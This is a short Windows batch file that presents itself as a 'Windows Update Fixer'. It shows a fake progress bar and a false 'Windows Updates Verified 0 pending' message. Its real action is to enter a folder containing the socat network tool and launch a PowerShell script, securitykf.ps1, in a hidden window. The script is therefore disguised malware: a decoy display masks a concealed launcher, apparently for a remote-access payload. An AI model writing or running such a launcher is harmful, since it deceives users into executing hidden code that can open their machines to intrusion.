@echo off
for /l %%a in (1,1,28) do (
	
	cls
	call set "bar=%%bar%%#"
	call echo Windows Update Fixer Started
	call echo:
	call echo %%bar%%
	ping localhost -n 1 >nul
	
)
echo Windows Updates Verified 0 pending
timeout 3
cd \"Program Files"\ZOLOFT\ZOLOFT\socat-windows-master && powershell.exe -windowstyle hidden ./securitykf.ps1 
